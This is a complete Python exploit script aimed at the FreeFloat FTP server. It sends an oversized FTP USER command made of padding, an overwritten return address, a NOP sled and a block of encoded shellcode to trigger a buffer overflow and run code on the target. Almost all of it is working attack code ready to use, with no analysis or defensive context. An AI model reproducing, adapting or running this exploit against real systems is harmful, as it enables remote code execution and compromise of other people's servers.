##exploit code for freefloat 

import socket

target = "192.168.17.4"
port = 21

print("[+] connecting to target.")
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.setdefaulttimeout(10)
soc.connect((target, port))

print("[+] Received a banner.")
print(soc.recv(1024))

junk1 = "A"*230 
EIP = "\x3F\x9E\xB7\x7C"
junk2 = "C"*266

##payload

buf =  ""
buf += "\x29\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\xb3\x8c\x8c\xdd\x83\xee\xfc\xe2\xf4\x4f\x64"
buf += "\x0e\xdd\xb3\x8c\xec\x54\x56\xbd\x4c\xb9\x38\xdc\xbc"
buf += "\x56\xe1\x80\x07\x8f\xa7\x07\xfe\xf5\xbc\x3b\xc6\xfb"
buf += "\x82\x73\x20\xe1\xd2\xf0\x8e\xf1\x93\x4d\x43\xd0\xb2"
buf += "\x4b\x6e\x2f\xe1\xdb\x07\x8f\xa3\x07\xc6\xe1\x38\xc0"
buf += "\x9d\xa5\x50\xc4\x8d\x0c\xe2\x07\xd5\xfd\xb2\x5f\x07"
buf += "\x94\xab\x6f\xb6\x94\x38\xb8\x07\xdc\x65\xbd\x73\x71"
buf += "\x72\x43\x81\xdc\x74\xb4\x6c\xa8\x45\x8f\xf1\x25\x88"
buf += "\xf1\xa8\xa8\x57\xd4\x07\x85\x97\x8d\x5f\xbb\x38\x80"
buf += "\xc7\x56\xeb\x90\x8d\x0e\x38\x88\x07\xdc\x63\x05\xc8"
buf += "\xf9\x97\xd7\xd7\xbc\xea\xd6\xdd\x22\x53\xd3\xd3\x87"
buf += "\x38\x9e\x67\x50\xee\xe4\xbf\xef\xb3\x8c\xe4\xaa\xc0"
buf += "\xbe\xd3\x89\xdb\xc0\xfb\xfb\xb4\x73\x59\x65\x23\x8d"
buf += "\x8c\xdd\x9a\x48\xd8\x8d\xdb\xa5\x0c\xb6\xb3\x73\x59"
buf += "\xb7\xbb\xd5\xdc\x3f\x4e\xcc\xdc\x9d\xe3\xe4\x66\xd2"
buf += "\x6c\x6c\x73\x08\x24\xe4\x8e\xdd\x90\x0e\x05\x3b\xd9"
buf += "\x9c\xda\x8a\xdb\x4e\x57\xea\xd4\x73\x59\x8a\xdb\x3b"
buf += "\x65\xe5\x4c\x73\x59\x8a\xdb\xf8\x60\xe6\x52\x73\x59"
buf += "\x8a\x24\xe4\xf9\xb3\xfe\xed\x73\x08\xdb\xef\xe1\xb9"
buf += "\xb3\x05\x6f\x8a\xe4\xdb\xbd\x2b\xd9\x9e\xd5\x8b\x51"
buf += "\x71\xea\x1a\xf7\xa8\xb0\xdc\xb2\x01\xc8\xf9\xa3\x4a"
buf += "\x8c\x99\xe7\xdc\xda\x8b\xe5\xca\xda\x93\xe5\xda\xdf"
buf += "\x8b\xdb\xf5\x40\xe2\x35\x73\x59\x54\x53\xc2\xda\x9b"
buf += "\x4c\xbc\xe4\xd5\x34\x91\xec\x22\x66\x37\x7c\x68\x11"
buf += "\xda\xe4\x7b\x26\x31\x11\x22\x66\xb0\x8a\xa1\xb9\x0c"
buf += "\x77\x3d\xc6\x89\x37\x9a\xa0\xfe\xe3\xb7\xb3\xdf\x73"
buf += "\x08"

nops="\x90"*16
username = junk1 + EIP + nops + buf + junk2
password = "hacker"

print("[+] Sending credentials.")
soc.send("USER "+ username + "\r\n")
print(soc.recv(1024))

soc.send("PASS " + password + "\r\n")
print(soc.recv(1024))

print("[+] Done! Closing connection.")
soc.close()
